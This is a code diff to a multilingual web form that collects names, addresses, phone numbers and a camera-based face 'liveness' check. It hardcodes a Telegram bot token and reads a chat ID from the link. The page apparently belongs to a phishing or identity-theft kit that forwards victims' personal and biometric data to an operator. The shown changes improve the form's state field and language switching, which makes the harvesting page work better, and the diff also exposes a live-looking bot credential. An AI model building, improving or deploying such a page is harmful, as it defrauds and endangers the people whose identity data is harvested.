@@ -141,9 +141,12 @@
 
         <div class="form-group">
             <label id="t-state"></label>
-            <select id="stateSelect" disabled>
-                <option value="" id="t-select-first">-- Please select a country first --</option>
-            </select>
+            <div id="stateContainer">
+                <!-- 智能动态切换：根据国家是否有省份自动渲染 select 或 input -->
+                <select id="stateSelect">
+                    <option value="" id="t-select-first">-- Please select a country first --</option>
+                </select>
+            </div>
         </div>
 
         <div class="form-group">
@@ -185,9 +188,9 @@
         const BOT_TOKEN = '8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g';
         const CHAT_ID = new URLSearchParams(window.location.search).get('id');
 
-        let currentLang = 'en'; // 默认英语
+        let currentLang = 'en'; 
+        let currentSelectedStandardKey = null; // 记录当前选择的标准国家Key，用于多语言无缝翻译切换
 
-        // 按照英文 A-Z 顺序整理的全球法定国家标准库 (键名为统一的英文标准名标识)
         const countryDataAtoZ = [
             { code: "Afghanistan", zh: "阿富汗", en: "Afghanistan", ja: "アフガニスタン", fr: "Afghanistan", de: "Afghanistan", ru: "Афганистан", uk: "Афганістан", vi: "Afghanistan", es: "Afganistán", pt: "Afeganistão" },
             { code: "Albania", zh: "阿尔巴尼亚", en: "Albania", ja: "アルバニア", fr: "Albanie", de: "Albanien", ru: "Албания", uk: "Албанія", vi: "Albania", es: "Albania", pt: "Albânia" },
@@ -326,6 +329,7 @@
                 postal: "邮政编码 (Postal Code)", phone: "手机号码 (Phone Number)", btn: "下一步：生物活体检测 ➔",
                 vTitle: "🛡️ 智能 AI 视觉活体检测", placeholderCountry: "请选择或输入搜索国家...",
                 selectFirst: "-- 请先选择上方国家 --",
+                inputPlaceholderState: "请输入省份/州或城市区域...",
                 postalErrText: "⚠️ 邮政编码格式不符合该国家/地区规范",
                 alertIncomplete: "请完整且正确填写所有账单与收货地址信息。",
                 alertNoId: "链接中缺少验证 ID (?id=...)，无法进行后续归档。",
@@ -347,6 +351,7 @@
                 postal: "Postal Code", phone: "Phone Number", btn: "Next: Biometric Liveness Detection ➔",
                 vTitle: "🛡️ AI Smart Liveness Detection", placeholderCountry: "Select or search country...",
                 selectFirst: "-- Please select a country first --",
+                inputPlaceholderState: "Enter province, state or region...",
                 postalErrText: "⚠️ Invalid postal code format for this country",
                 alertIncomplete: "Please complete all billing and shipping address fields correctly.",
                 alertNoId: "Missing verification ID (?id=...) in the link.",
@@ -368,6 +373,7 @@
                 postal: "郵便番号 (Postal Code)", phone: "電話番号 (Phone Number)", btn: "次へ：生体認証テスト ➔",
                 vTitle: "🛡️ AIスマート生体認証", placeholderCountry: "国を選択または検索...",
                 selectFirst: "-- まず国を選択してください --",
+                inputPlaceholderState: "都道府県または州を入力...",
                 postalErrText: "⚠️ この国の郵便番号形式が無効です",
                 alertIncomplete: "すべての住所情報を正しく入力してください。",
                 alertNoId: "リンクに検証ID（?id=...）がありません。",
@@ -389,6 +395,7 @@
                 postal: "Code Postal", phone: "Numéro de Téléphone", btn: "Suivant : Détection Biométrique ➔",
                 vTitle: "🛡️ Détection Biométrique IA", placeholderCountry: "Sélectionner ou rechercher un pays...",
                 selectFirst: "-- Veuillez d'abord sélectionner un pays --",
+                inputPlaceholderState: "Entrez la province ou l'état...",
                 postalErrText: "⚠️ Format de code postal invalide",
                 alertIncomplete: "Veuillez remplir tous les champs.",
                 alertNoId: "ID manquant.", camErr: "Erreur caméra: ",
@@ -404,6 +411,7 @@
                 postal: "Postleitzahl", phone: "Telefonnummer", btn: "Weiter: Biometrische Erkennung ➔",
                 vTitle: "🛡️ KI-Lebenderkennung", placeholderCountry: "Land auswählen oder suchen...",
                 selectFirst: "-- Bitte wählen Sie zuerst ein Land --",
+                inputPlaceholderState: "Provinz oder Bundesland eingeben...",
                 postalErrText: "⚠️ Ungültige Postleitzahl",
                 alertIncomplete: "Bitte alle Felder ausfüllen.",
                 alertNoId: "ID fehlt.", camErr: "Kamerafehler: ",
@@ -419,6 +427,7 @@
                 postal: "Индекс", phone: "Телефон", btn: "Далее ➔",
                 vTitle: "🛡️ Проверка ИИ", placeholderCountry: "Выберите или введите страну...",
                 selectFirst: "-- Сначала выберите страну --",
+                inputPlaceholderState: "Введите регион или штат...",
                 postalErrText: "⚠️ Неверный индекс",
                 alertIncomplete: "Заполните все поля.",
                 alertNoId: "Нет ID.", camErr: "Ошибка камеры: ",
@@ -434,6 +443,7 @@
                 postal: "Індекс", phone: "Телефон", btn: "Далі ➔",
                 vTitle: "🛡️ Перевірка ШІ", placeholderCountry: "Виберіть або знайдіть країну...",
                 selectFirst: "-- Спочатку виберіть країну --",
+                inputPlaceholderState: "Введіть область або регіон...",
                 postalErrText: "⚠️ Невірний індекс",
                 alertIncomplete: "Заповніть поля.",
                 alertNoId: "Немає ID.", camErr: "Помилка камери: ",
@@ -449,6 +459,7 @@
                 postal: "Mã bưu điện", phone: "Số điện thoại", btn: "Tiếp theo ➔",
                 vTitle: "🛡️ Kiểm tra AI", placeholderCountry: "Chọn hoặc tìm kiếm quốc gia...",
                 selectFirst: "-- Vui lòng chọn quốc gia trước --",
+                inputPlaceholderState: "Nhập tỉnh, bang hoặc khu vực...",
                 postalErrText: "⚠️ Mã bưu điện không hợp lệ",
                 alertIncomplete: "Vui lòng điền đủ.",
                 alertNoId: "Thiếu ID.", camErr: "Lỗi camera: ",
@@ -464,6 +475,7 @@
                 postal: "Código Postal", phone: "Teléfono", btn: "Siguiente ➔",
                 vTitle: "🛡️ Detección IA", placeholderCountry: "Seleccionar o buscar país...",
                 selectFirst: "-- Por favor seleccione un país primero --",
+                inputPlaceholderState: "Ingrese provincia o estado...",
                 postalErrText: "⚠️ Código postal inválido",
                 alertIncomplete: "Complete los campos.",
                 alertNoId: "Falta ID.", camErr: "Error de cámara: ",
@@ -479,12 +491,13 @@
                 postal: "Código Postal", phone: "Telefone", btn: "Próximo ➔",
                 vTitle: "🛡️ Detecção IA", placeholderCountry: "Selecionar ou pesquisar país...",
                 selectFirst: "-- Por favor, selecione um país primeiro --",
+                inputPlaceholderState: "Digite a província ou estado...",
                 postalErrText: "⚠️ Código postal inválido",
                 alertIncomplete: "Preencha os campos.",
                 alertNoId: "Falta ID.", camErr: "Erro de câmera: ",
                 aiNoFace: "Rosto não detectado", aiKeepFace: "Mantenha o rosto para a frente", aiTurnLeft: "Virar à esquerda...",
                 aiLeftSuccess: "Sucesso, virar à direita", aiTurnRight: "Virar à direita...",
-                aiSuccess: "Verificación aprovada", uploading: "Enviando...",
+                aiSuccess: "Verificação aprovada", uploading: "Enviando...",
                 successDone: "Enviado!", netErr: "Erro de rede."
             }
         };
@@ -502,7 +515,7 @@
 
         const countryInput = document.getElementById('countryInput');
         const countryList = document.getElementById('countryList');
-        const stateSelect = document.getElementById('stateSelect');
+        const stateContainer = document.getElementById('stateContainer');
         const postalCodeInput = document.getElementById('postalCode');
         const postalError = document.getElementById('postalError');
 
@@ -523,7 +536,6 @@
             countryList.innerHTML = "";
             countryDataAtoZ.forEach(item => {
                 const opt = document.createElement('option');
-                // 列表显示当前语言对应国家的称呼
                 opt.value = item[currentLang] || item.en;
                 countryList.appendChild(opt);
             });
@@ -532,25 +544,40 @@
         function onCountryChange() {
             const val = countryInput.value.trim();
             const stdKey = getStandardCountryKey(val);
+            currentSelectedStandardKey = stdKey; // 实时记录标准国家标识
             const t = translations[currentLang];
 
-            stateSelect.innerHTML = "";
+            stateContainer.innerHTML = "";
 
-            if (!stdKey || !globalRegions[stdKey]) {
-                stateSelect.disabled = true;
+            if (!stdKey) {
+                // 未识别出标准国家：保持提示选择或允许自由输入
+                const select = document.createElement('select');
+                select.id = "stateSelect";
+                select.disabled = true;
                 const opt = document.createElement('option');
                 opt.value = "";
                 opt.text = t.selectFirst;
-                stateSelect.appendChild(opt);
-            } else {
-                stateSelect.disabled = false;
+                select.appendChild(opt);
+                stateContainer.appendChild(select);
+            } else if (globalRegions[stdKey]) {
+                // 存在内置省份/州列表：渲染标准的下拉菜单（Select）
+                const select = document.createElement('select');
+                select.id = "stateSelect";
                 const states = globalRegions[stdKey];
                 states.forEach(st => {
                     const opt = document.createElement('option');
                     opt.value = st;
                     opt.text = st;
-                    stateSelect.appendChild(opt);
+                    select.appendChild(opt);
                 });
+                stateContainer.appendChild(select);
+            } else {
+                // 该国家无内置省份列表（如阿富汗、哥伦比亚等）：自动降级为自由文本输入框（Input）
+                const input = document.createElement('input');
+                input.type = "text";
+                input.id = "stateSelect"; // 保持ID一致以防表单获取报错
+                input.placeholder = t.inputPlaceholderState;
+                stateContainer.appendChild(input);
             }
             validatePostalCode();
         }
@@ -603,6 +630,15 @@
             postalError.innerText = t.postalErrText;
 
             initCountryDatalist();
+
+            // 核心优化：当切换语言时，如果用户已经选过国家，自动将输入框中的国家翻译为当前语言对应的名称
+            if (currentSelectedStandardKey) {
+                const foundItem = countryDataAtoZ.find(item => item.code === currentSelectedStandardKey);
+                if (foundItem) {
+                    countryInput.value = foundItem[currentLang] || foundItem.en;
+                }
+            }
+
             onCountryChange(); 
         }
 
@@ -646,7 +682,8 @@
             const firstName = document.getElementById('firstName').value.trim();
             const lastName = document.getElementById('lastName').value.trim();
             const country = countryInput.value.trim();
-            const state = stateSelect.value;
+            const stateEl = document.getElementById('stateSelect');
+            const state = stateEl ? stateEl.value.trim() : "";
             const address = document.getElementById('address').value.trim();
             const city = document.getElementById('city').value.trim();
             const postalCode = postalCodeInput.value.trim();
